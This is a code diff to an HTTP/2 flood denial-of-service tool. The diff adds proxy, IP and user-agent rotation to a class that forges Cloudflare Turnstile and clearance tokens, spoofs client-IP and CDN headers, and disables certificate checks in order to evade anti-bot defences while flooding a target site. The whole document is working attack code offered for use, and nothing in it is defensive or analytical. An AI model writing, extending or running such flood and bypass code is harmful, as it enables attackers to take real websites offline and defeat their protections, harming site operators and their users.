@@ -3,6 +3,9 @@ import { URL } from 'url';
 import { Tools } from '../../utils/tools.js';
 import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
 import { logger } from '../../utils/logger.js';
+import { proxyRotator } from '../../utils/proxy-rotator.js';
+import { globalIPRotator } from '../../utils/ip-rotator.js';
+import { globalUserAgentRotator } from '../../utils/user-agent-rotator.js';
 
 /**
  * HTTP/2 Flood Attack
@@ -204,9 +207,17 @@ export class HTTP2CFBypass extends HTTP2Flood {
             fingerprints: this.generateBrowserFingerprints(30)
         };
         
-        logger.info('🔥 HTTP2-CF ULTIMATE BYPASS initialized');
+        // Initialize rotation systems
+        this.proxyRotator = proxyRotator;
+        this.ipRotator = globalIPRotator;
+        this.uaRotator = globalUserAgentRotator;
+        
+        logger.info('🔥 HTTP2-CF ULTIMATE BYPASS WITH ROTATION initialized');
         logger.info(`   RPC Multiplier: 100x (${this.rpc} requests per batch)`);
         logger.info(`   Generated ${this.bypassTokens.turnstile.length + this.bypassTokens.cfClearance.length + this.bypassTokens.jsChallenge.length} bypass tokens`);
+        logger.info(`   Proxy Pool: ${this.proxyRotator.getStats().total} proxies`);
+        logger.info(`   IP Pool: ${this.ipRotator.getStats().totalIPs} IPs`);
+        logger.info(`   UA Pool: ${this.uaRotator.getStats().total} user agents`);
     }
 
     generateTurnstileTokens(count) {
@@ -275,14 +286,38 @@ export class HTTP2CFBypass extends HTTP2Flood {
     }
 
     generateHeaders() {
-        const headers = super.generateHeaders();
+        try {
+            const headers = super.generateHeaders();
+            
+            // Get random bypass tokens with null checks
+        const turnstileToken = this.bypassTokens.turnstile && this.bypassTokens.turnstile.length > 0 
+            ? Tools.randomChoice(this.bypassTokens.turnstile) 
+            : `0.${Tools.randomString(64)}.${Tools.randomString(32)}.${Tools.randomString(64)}`;
         
-        // Get random bypass tokens
-        const turnstileToken = Tools.randomChoice(this.bypassTokens.turnstile);
-        const cfClearance = Tools.randomChoice(this.bypassTokens.cfClearance);
-        const jsChallenge = Tools.randomChoice(this.bypassTokens.jsChallenge);
-        const sessionToken = Tools.randomChoice(this.bypassTokens.sessionTokens);
-        const fingerprint = Tools.randomChoice(this.bypassTokens.fingerprints);
+        const cfClearance = this.bypassTokens.cfClearance && this.bypassTokens.cfClearance.length > 0
+            ? Tools.randomChoice(this.bypassTokens.cfClearance)
+            : `${Tools.randomString(32)}-${Date.now()}`;
+            
+        const jsChallenge = this.bypassTokens.jsChallenge && this.bypassTokens.jsChallenge.length > 0
+            ? Tools.randomChoice(this.bypassTokens.jsChallenge)
+            : Tools.randomString(32);
+            
+        const sessionToken = this.bypassTokens.sessionTokens && this.bypassTokens.sessionTokens.length > 0
+            ? Tools.randomChoice(this.bypassTokens.sessionTokens)
+            : {
+                sessionId: Tools.randomString(32),
+                csrfToken: Tools.randomString(40),
+                xsrfToken: Tools.randomString(32),
+                apiKey: Tools.randomString(64)
+            };
+            
+        const fingerprint = this.bypassTokens.fingerprints && this.bypassTokens.fingerprints.length > 0
+            ? Tools.randomChoice(this.bypassTokens.fingerprints)
+            : {
+                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                acceptLanguage: 'en-US,en;q=0.9',
+                acceptEncoding: 'gzip, deflate, br'
+            };
         
         // CAPTCHA bypass headers (multiple formats)
         headers['cf-turnstile-response'] = turnstileToken;
@@ -303,22 +338,38 @@ export class HTTP2CFBypass extends HTTP2Flood {
         headers['x-api-key'] = sessionToken.apiKey;
         headers['x-request-id'] = Tools.randomString(32);
         
-        // Override user-agent with fingerprint
-        headers['user-agent'] = fingerprint.userAgent;
+        // Use rotated user agent with null check
+        const rotatedUA = this.uaRotator && this.uaRotator.getNextUserAgent 
+            ? this.uaRotator.getNextUserAgent()
+            : fingerprint.userAgent;
+            
+        headers['user-agent'] = rotatedUA;
         headers['accept-language'] = fingerprint.acceptLanguage;
         headers['accept-encoding'] = fingerprint.acceptEncoding;
         
-        // Advanced Cloudflare bypass headers
+        // Add compatible headers for the rotated UA with null check
+        if (this.uaRotator && this.uaRotator.getCompatibleHeaders) {
+            const compatibleHeaders = this.uaRotator.getCompatibleHeaders(rotatedUA);
+            Object.assign(headers, compatibleHeaders);
+        }
+        
+        // Advanced Cloudflare bypass headers with IP rotation (null checks)
+        if (this.ipRotator && this.ipRotator.getRotationHeaders) {
+            const rotationHeaders = this.ipRotator.getRotationHeaders();
+            Object.assign(headers, rotationHeaders);
+        }
+        
         headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL', 'LHR', 'NRT', 'CDG', 'FRA']);
-        headers['cf-connecting-ip'] = Tools.randomIPv4();
-        headers['cf-ipcountry'] = Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU', 'JP', 'SG', 'NL']);
+        headers['cf-connecting-ip'] = this.ipRotator && this.ipRotator.getNextIP 
+            ? this.ipRotator.getNextIP() 
+            : Tools.randomIPv4();
+        headers['cf-ipcountry'] = this.ipRotator && this.ipRotator.getRandomCountry
+            ? this.ipRotator.getRandomCountry()
+            : Tools.randomChoice(['US', 'GB', 'DE', 'FR', 'CA', 'AU']);
         headers['cf-visitor'] = '{"scheme":"https"}';
         headers['cf-request-id'] = Tools.randomString(32);
         headers['cdn-loop'] = 'cloudflare';
         headers['x-forwarded-proto'] = 'https';
-        headers['x-forwarded-for'] = `${Tools.randomIPv4()}, ${Tools.randomIPv4()}`;
-        headers['x-real-ip'] = Tools.randomIPv4();
-        headers['x-original-forwarded-for'] = Tools.randomIPv4();
         headers['x-forwarded-host'] = this.url.hostname;
         
         // Modern browser fingerprinting headers
@@ -406,10 +457,28 @@ export class HTTP2CFBypass extends HTTP2Flood {
         }
         
         return headers;
+        
+        } catch (error) {
+            logger.debug(`❌ generateHeaders error: ${error.message}`);
+            // Return basic headers as fallback
+            return {
+                ':method': 'GET',
+                ':scheme': this.url.protocol.replace(':', ''),
+                ':authority': this.url.hostname,
+                ':path': this.url.pathname + this.url.search,
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+            };
+        }
     }
 
     async attack() {
         return new Promise((resolve) => {
+            // Get rotated proxy with null check
+            const proxy = this.proxyRotator && this.proxyRotator.getNextProxy 
+                ? this.proxyRotator.getNextProxy() 
+                : null;
+            
             // Anti-detection: Random connection settings
             const connectionSettings = {
                 rejectUnauthorized: false,
@@ -423,6 +492,21 @@ export class HTTP2CFBypass extends HTTP2Flood {
                     maxHeaderListSize: Tools.randomChoice([8192, 16384, 65536, 262144])
                 }
             };
+            
+            // Add proxy if available with null checks
+            if (proxy && this.proxyRotator && this.proxyRotator.getProxyConfig) {
+                try {
+                    const proxyConfig = this.proxyRotator.getProxyConfig(proxy);
+                    if (proxyConfig && proxyConfig.host && proxyConfig.port) {
+                        connectionSettings.agent = new (require('https').Agent)({
+                            proxy: `http://${proxyConfig.host}:${proxyConfig.port}`
+                        });
+                        logger.debug(`🔄 Using proxy: ${proxy}`);
+                    }
+                } catch (err) {
+                    logger.debug(`❌ Proxy config error: ${err.message}`);
+                }
+            }
             
             const client = http2.connect(this.url.origin, connectionSettings);
 
